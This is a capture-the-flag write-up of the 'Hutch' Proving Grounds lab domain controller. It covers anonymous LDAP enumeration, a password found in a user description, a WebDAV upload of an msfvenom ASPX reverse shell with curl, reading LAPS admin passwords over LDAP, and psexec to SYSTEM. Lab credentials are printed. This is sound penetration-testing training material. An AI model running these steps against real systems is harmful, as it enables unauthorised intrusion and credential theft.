---
description: PG Practice Hutch writeup
---

# Hutch

## Nmap

```
sudo nmap 192.168.89.122 -p- -sV -sS    

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos 
(server time: 2021-03-01 21:29:49Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP 
(Domain: hutch.offsec0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP 
(Domain: hutch.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49688/tcp open  msrpc         Microsoft Windows RPC
49767/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: HUTCHDC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Starting off looking at LDAP running some LDAP related `nmap` scripts to enumerate.

```
nmap -n -sV --script "ldap* and not brute" 192.168.89.122  
```

![](<../../../.gitbook/assets/image (842).png>)

Looking through the results we do not have much interesting information but we do have the naming connect off hutch.offsec for the DC.

Having this information we can run LDAP search with the naming context included to enumerate users and `grep` by SAM account name.

```
ldapsearch -x -h 192.168.89.122 -D '' -w '' -b "DC=hutch,DC=offsec" |
 grep sAMAccountName:
```

![](<../../../.gitbook/assets/image (843) (1).png>)

We now have the following users list:

```
rplacidi
opatry
ltaunton
acostello
jsparwell
oknee
jmckendry
avictoria
jfrarey
eaburrow
cluddy
agitthouse
fmcsorley
```

Running the same LDAP command as above except this time grepping for the description we see the following:

```
ldapsearch -x -h 192.168.89.122 -D '' -w '' -b "DC=hutch,DC=offsec" |
grep description
```

![](<../../../.gitbook/assets/image (844).png>)

We have a password in the last line which we can correlate with being the last users in the entry list of fmcsorley for the combined credentials of `fmcsorley:CrabSharkJellyfish192`

Checking the credentials with `crackmpaexec` against SMB shows we have valid information.

```
crackmapexec smb 192.168.89.122 -u fmcsorley -p CrabSharkJellyfish192
```

![](<../../../.gitbook/assets/image (845).png>)

With valid SMB credentials I was unable to enumerate any further interesting information. From the Nikto results earlier we do have Webdav enabled.

![](<../../../.gitbook/assets/image (846) (1).png>)

Without a specific directory enabled we can attempt to upload with curl on the root page. I first created a `msfvenom` ASPX reverse shell then attempted to upload with `curl` ensuring the valid credentials we have are used.

```
curl -T '/home/kali/shell.aspx' 'http://192.168.64.122/' -u fmcsorley:CrabSharkJellyfish192
```

I set the shell to talk back on port 445 and set a `netcat` listener on the same port. After browsing to 192.168.64.122/shell.aspx I received a shell back on my listener.

![](<../../../.gitbook/assets/image (847).png>)

After going through the system we do see that LAPS has been installed on the server.

![](<../../../.gitbook/assets/image (848).png>)

Its possible that LAPS or LDAP has been misconfigured enough to potentially contains the computer passwords for computer object in AD. Knowing this we can go back and search LDAP with the credentials with have specifically looking for the _ms-Mcs-AdmPwd attribute._

```
ldapsearch -x -h 192.168.64.122 -D 'hutch\fmcsorley' -w 'CrabSharkJellyfish192' -b 'dc=hutch,dc=offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd 
```

![](<../../../.gitbook/assets/image (849).png>)

We can see for the domain controller the LAPS password set is `J6QOuU+lhs[SH/` I then confirmed the credentials with `crackmapexec` against LDAP using the local administrator account and was given successful confirmation.

![](<../../../.gitbook/assets/image (850).png>)

I was then able to use these credentials with Impacket's psexec.py to gain access to the Domain Controller as SYSTEM.

![](<../../../.gitbook/assets/image (851).png>)
